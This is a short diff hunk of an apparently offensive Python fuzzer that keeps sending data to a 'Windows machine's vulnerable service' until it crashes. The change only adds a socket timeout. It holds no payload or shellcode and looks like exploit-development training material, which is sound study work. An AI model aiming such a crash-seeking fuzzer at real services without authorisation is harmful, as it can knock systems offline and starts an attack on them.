@@ -19,6 +19,7 @@ while True: #Runs continuously until crash
 	try:
 		with socket.socket() as s: #context manager for our socket
 			s.connect((ip,port)) #connect to Windows machine's vulnerable service
+			s.settimeout(4)
 			print("sending  {} bytes".format(len(string))) #tell us what is being sent
 			s.send(bytes(string,'latin-1')) #sent the string, as bytes from latin ascii
 			reply = s.recv(4096) #see what the reply is
